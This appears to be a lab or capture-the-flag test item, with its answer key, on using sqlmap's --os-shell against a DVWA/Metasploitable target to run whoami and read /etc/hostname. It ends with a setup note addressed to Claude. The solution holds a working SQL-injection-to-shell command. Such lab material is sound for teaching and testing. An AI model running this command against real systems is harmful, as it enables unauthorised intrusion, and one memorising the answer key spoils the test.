# Q259 — Get OS Shell via SQLMap

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🔴 Hard |
| **Tools** | `sqlmap` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use sqlmap to get an OS shell on the target via `--os-shell`. Execute `whoami` and `cat /etc/hostname` through the shell."

---

## 🎯 Flag Format

```
user=<username>; hostname=<name>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --os-shell --batch
# In os-shell:
# os-shell> whoami
# os-shell> cat /etc/hostname
```

**Answer:** `user=www-data; hostname=metasploitable`

---

## 🤖 Claude Setup Prompt

Same as Q251. MySQL needs FILE privilege for --os-shell. Report back: "Lab ready for Q259"
